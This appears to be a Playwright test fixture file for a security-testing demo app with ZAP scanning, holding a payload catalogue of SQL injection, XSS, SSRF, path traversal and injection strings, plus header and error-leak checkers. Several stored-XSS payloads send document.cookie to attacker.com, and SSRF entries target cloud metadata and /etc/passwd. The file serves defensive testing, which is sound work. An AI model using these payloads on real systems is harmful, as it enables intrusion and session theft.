import { test as base, expect } from '@playwright/test';
import { HomePage } from '../pages/HomePage';
import { LoginPage } from '../pages/LoginPage';
import { AdminPage } from '../pages/AdminPage';
import { SearchPage } from '../pages/SearchPage';
import { RegistrationPage } from '../pages/RegistrationPage';
import { IDORPage } from '../pages/IDORPage';

// ZAP-specific test configuration and utilities
export interface ZapTestConfig {
  runVulnTests: boolean;
  secureMode: boolean;
  stagingUrl: string;
  zapHighThreshold: number;
  zapMediumThreshold: number;
}

export interface ZapPayloads {
  // SQL Injection payloads
  sqlInjection: {
    union: string[];
    boolean: string[];
    timeBased: string[];
    errorBased: string[];
  };
  
  // XSS payloads
  xss: {
    reflected: string[];
    dom: string[];
    stored: string[];
    filter_bypass: string[];
  };
  
  // SSRF payloads
  ssrf: {
    localhost: string[];
    metadata: string[];
    internal: string[];
    protocols: string[];
  };
  
  // Directory traversal
  pathTraversal: string[];
  
  // Code injection
  codeInjection: {
    eval: string[];
    template: string[];
    deserialization: string[];
  };
}

export interface ZapTestUtilities {
  // Environment checks
  shouldRunVulnTests(): boolean;
  shouldRunSecureMode(): boolean;
  
  // Payload generators
  getPayloads(): ZapPayloads;
  generateRandomPayload(type: keyof ZapPayloads): string;
  
  // Security testing helpers
  testRateLimit(endpoint: string, maxRequests: number): Promise<boolean>;
  checkSecurityHeaders(response: any): SecurityHeadersReport;
  validateErrorMessage(content: string): boolean;
  detectInformationDisclosure(content: string): string[];
  
  // ZAP integration helpers
  formatZapReport(findings: any[]): ZapReport;
  calculateSecurityScore(findings: any[]): SecurityScore;
}

export interface SecurityHeadersReport {
  csp: { present: boolean; value?: string; secure: boolean };
  xContentTypeOptions: { present: boolean; value?: string };
  xFrameOptions: { present: boolean; value?: string };
  xXssProtection: { present: boolean; value?: string };
  hsts: { present: boolean; value?: string; secure: boolean };
  referrerPolicy: { present: boolean; value?: string };
  score: number;
  total: number;
}

export interface ZapReport {
  high: number;
  medium: number;
  low: number;
  informational: number;
  total: number;
  passed: boolean;
}

export interface SecurityScore {
  score: number;
  grade: 'A' | 'B' | 'C' | 'D' | 'F';
  issues: string[];
  recommendations: string[];
}

type ZapFixtures = {
  homePage: HomePage;
  loginPage: LoginPage;
  adminPage: AdminPage;
  searchPage: SearchPage;
  registrationPage: RegistrationPage;
  idorPage: IDORPage;
  zapConfig: ZapTestConfig;
  zapUtils: ZapTestUtilities;

  /**
   * When enabled (default), each test starts by navigating to '/'.
   * Disable via: test.use({ autoGoto: false }) in a describe/test.
   */
  autoGoto: boolean;
  /** Internal auto-fixture that performs the navigation. */
  gotoHome: void;
};

export const test = base.extend<ZapFixtures>({
  autoGoto: [true, { option: true }],

  gotoHome: [
    async ({ page, autoGoto }, use) => {
      if (autoGoto) {
        const response = await page.goto('/');
        expect(response?.status()).toBe(200);
        await expect(page.getByRole('heading', { name: 'Security Testing Demo' })).toBeVisible();
      }

      await use(undefined);
    },
    { auto: true }
  ],

  zapConfig: async ({}, use) => {
    const config: ZapTestConfig = {
      runVulnTests: process.env.RUN_VULN_TESTS === '1',
      secureMode: process.env.SECURE_MODE === '1',
      stagingUrl: process.env.STAGING_URL || 'http://localhost:3000',
      zapHighThreshold: parseInt(process.env.ZAP_HIGH_THRESHOLD || '0'),
      zapMediumThreshold: parseInt(process.env.ZAP_MEDIUM_THRESHOLD || '5'),
    };
    await use(config);
  },

  zapUtils: async ({ zapConfig }, use) => {
    const utils: ZapTestUtilities = {
      shouldRunVulnTests: () => zapConfig.runVulnTests,
      shouldRunSecureMode: () => zapConfig.secureMode,
      
      getPayloads: (): ZapPayloads => ({
        sqlInjection: {
          union: [
            "' UNION SELECT username, password FROM users--",
            "' UNION SELECT 1, @@version--",
            "' UNION SELECT null, table_name FROM information_schema.tables--"
          ],
          boolean: [
            "' OR '1'='1'--",
            "' OR 1=1--",
            "admin' OR '1'='1'/*",
            "' OR 'x'='x'--"
          ],
          timeBased: [
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5)--",
            "'; SELECT pg_sleep(5)--"
          ],
          errorBased: [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--",
            "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--"
          ]
        },
        
        xss: {
          reflected: [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>'
          ],
          dom: [
            '#<script>alert("DOM_XSS")</script>',
            'javascript:alert("DOM_XSS")',
            '<iframe src=javascript:alert(1)></iframe>'
          ],
          stored: [
            '<script>document.location="http://attacker.com/"+document.cookie</script>',
            '<img src=x onerror=this.src="http://attacker.com/?cookie="+document.cookie>',
            '<svg/onload=fetch("http://attacker.com/",{method:"POST",body:document.cookie})>'
          ],
          filter_bypass: [
            '<ScRiPt>alert(1)</ScRiPt>',
            '<img src="x" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
            '<svg><script>alert&#40;1&#41;</script></svg>',
            '"><svg/onload=alert(1)//'
          ]
        },
        
        ssrf: {
          localhost: [
            'http://localhost',
            'http://127.0.0.1',
            'http://0.0.0.0',
            'http://[::1]',
            'http://127.1',
            'http://0177.0.0.1'
          ],
          metadata: [
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://100.100.100.200/latest/meta-data/'
          ],
          internal: [
            'http://192.168.1.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            'http://internal.example.com'
          ],
          protocols: [
            'file:///etc/passwd',
            'ftp://internal.server/',
            'gopher://127.0.0.1:6379/_*1*3*3*SET*1*0*$',
            'dict://127.0.0.1:11211/stats'
          ]
        },
        
        pathTraversal: [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ],
        
        codeInjection: {
          eval: [
            'eval("alert(1)")',
            'Function("return process")();',
            'setTimeout("alert(1)", 100)',
            'setInterval("alert(1)", 100)'
          ],
          template: [
            '${7*7}',
            '{{7*7}}',
            '<%= 7*7 %>',
            '#{7*7}',
            '{%7*7%}'
          ],
          deserialization: [
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"admin":true}}}',
            '{"toString":{"constructor":"alert(1)"}}'
          ]
        }
      }),
      
      generateRandomPayload: (type: keyof ZapPayloads): string => {
        const payloads = utils.getPayloads()[type];
        if (Array.isArray(payloads)) {
          return payloads[Math.floor(Math.random() * payloads.length)];
        }
        // For nested payload types, pick a random category
        const categories = Object.keys(payloads);
        const randomCategory = categories[Math.floor(Math.random() * categories.length)];
        const categoryPayloads = (payloads as any)[randomCategory];
        return categoryPayloads[Math.floor(Math.random() * categoryPayloads.length)];
      },
      
      testRateLimit: async (endpoint: string, maxRequests: number = 10): Promise<boolean> => {
        const requests = Array.from({ length: maxRequests }, (_, i) => 
          fetch(endpoint, { method: 'POST', body: JSON.stringify({ test: i }) })
        );
        
        const responses = await Promise.all(requests.map(req => 
          req.catch(err => ({ status: 0, ok: false }))
        ));
        
        return responses.some(response => 
          'status' in response && response.status === 429
        );
      },
      
      checkSecurityHeaders: (response: any): SecurityHeadersReport => {
        const headers = response.headers();
        
        const cspValue = headers['content-security-policy'];
        const csp = {
          present: !!cspValue,
          value: cspValue,
          secure: cspValue ? !cspValue.includes("'unsafe-inline'") && !cspValue.includes("'unsafe-eval'") : false
        };
        
        const xContentTypeOptions = {
          present: !!headers['x-content-type-options'],
          value: headers['x-content-type-options']
        };
        
        const xFrameOptions = {
          present: !!headers['x-frame-options'],
          value: headers['x-frame-options']
        };
        
        const xXssProtection = {
          present: !!headers['x-xss-protection'],
          value: headers['x-xss-protection']
        };
        
        const hstsValue = headers['strict-transport-security'];
        const hsts = {
          present: !!hstsValue,
          value: hstsValue,
          secure: hstsValue ? hstsValue.includes('max-age=') && parseInt(hstsValue.match(/max-age=(\d+)/)?.[1] || '0') > 31536000 : false
        };
        
        const referrerPolicy = {
          present: !!headers['referrer-policy'],
          value: headers['referrer-policy']
        };
        
        const total = 6;
        let score = 0;
        if (csp.present && csp.secure) score++;
        if (xContentTypeOptions.present) score++;
        if (xFrameOptions.present) score++;
        if (xXssProtection.present) score++;
        if (hsts.present && hsts.secure) score++;
        if (referrerPolicy.present) score++;
        
        return {
          csp,
          xContentTypeOptions,
          xFrameOptions,
          xXssProtection,
          hsts,
          referrerPolicy,
          score,
          total
        };
      },
      
      validateErrorMessage: (content: string): boolean => {
        const sensitivePatterns = [
          /mysql|postgresql|sqlite|database/i,
          /stack trace|traceback/i,
          /C:\\|\/usr\/|\/var\//i,
          /node_modules|\.js:\d+/i,
          /internal server error.*details/i,
          /exception|error.*line/i
        ];
        
        return !sensitivePatterns.some(pattern => pattern.test(content));
      },
      
      detectInformationDisclosure: (content: string): string[] => {
        const disclosures = [];
        
        if (content.match(/version.*\d+\.\d+/i)) {
          disclosures.push('Version information');
        }
        if (content.match(/powered.*by/i)) {
          disclosures.push('Technology stack');
        }
        if (content.match(/debug.*true/i)) {
          disclosures.push('Debug mode enabled');
        }
        if (content.match(/mysql|postgresql|mongodb/i)) {
          disclosures.push('Database information');
        }
        if (content.match(/C:\\|\/usr\/|\/var\/|\/etc\//)) {
          disclosures.push('File system paths');
        }
        if (content.match(/stack.*trace|traceback/i)) {
          disclosures.push('Stack traces');
        }
        
        return disclosures;
      },
      
      formatZapReport: (findings: any[]): ZapReport => {
        const report = {
          high: findings.filter(f => f.risk === 'High').length,
          medium: findings.filter(f => f.risk === 'Medium').length,
          low: findings.filter(f => f.risk === 'Low').length,
          informational: findings.filter(f => f.risk === 'Informational').length,
          total: findings.length,
          passed: false
        };
        
        report.passed = report.high <= zapConfig.zapHighThreshold && 
                       report.medium <= zapConfig.zapMediumThreshold;
        
        return report;
      },
      
      calculateSecurityScore: (findings: any[]): SecurityScore => {
        const high = findings.filter(f => f.risk === 'High').length;
        const medium = findings.filter(f => f.risk === 'Medium').length;
        const low = findings.filter(f => f.risk === 'Low').length;
        
        // Calculate score (100 - weighted penalties)
        let score = 100;
        score -= high * 20;    // -20 per high
        score -= medium * 10;  // -10 per medium  
        score -= low * 2;      // -2 per low
        
        score = Math.max(0, score);
        
        let grade: 'A' | 'B' | 'C' | 'D' | 'F';
        if (score >= 90) grade = 'A';
        else if (score >= 80) grade = 'B';
        else if (score >= 70) grade = 'C';
        else if (score >= 60) grade = 'D';
        else grade = 'F';
        
        const issues = [
          ...Array(high).fill('High-risk vulnerability'),
          ...Array(medium).fill('Medium-risk vulnerability'),
          ...Array(low).fill('Low-risk vulnerability')
        ];
        
        const recommendations = [];
        if (high > 0) recommendations.push('Address high-risk vulnerabilities immediately');
        if (medium > 5) recommendations.push('Reduce medium-risk vulnerabilities');
        if (low > 10) recommendations.push('Consider addressing low-risk findings');
        if (score < 80) recommendations.push('Implement additional security controls');
        
        return {
          score,
          grade,
          issues,
          recommendations
        };
      }
    };
    
    await use(utils);
  },

  homePage: async ({ page }, use) => {
    const homePage = new HomePage(page);
    await use(homePage);
  },

  loginPage: async ({ page }, use) => {
    const loginPage = new LoginPage(page);
    await use(loginPage);
  },

  adminPage: async ({ page }, use) => {
    const adminPage = new AdminPage(page);
    await use(adminPage);
  },

  searchPage: async ({ page }, use) => {
    const searchPage = new SearchPage(page);
    await use(searchPage);
  },

  registrationPage: async ({ page }, use) => {
    const registrationPage = new RegistrationPage(page);
    await use(registrationPage);
  },

  idorPage: async ({ page }, use) => {
    const idorPage = new IDORPage(page);
    await use(idorPage);
  }
});

export { expect } from '@playwright/test';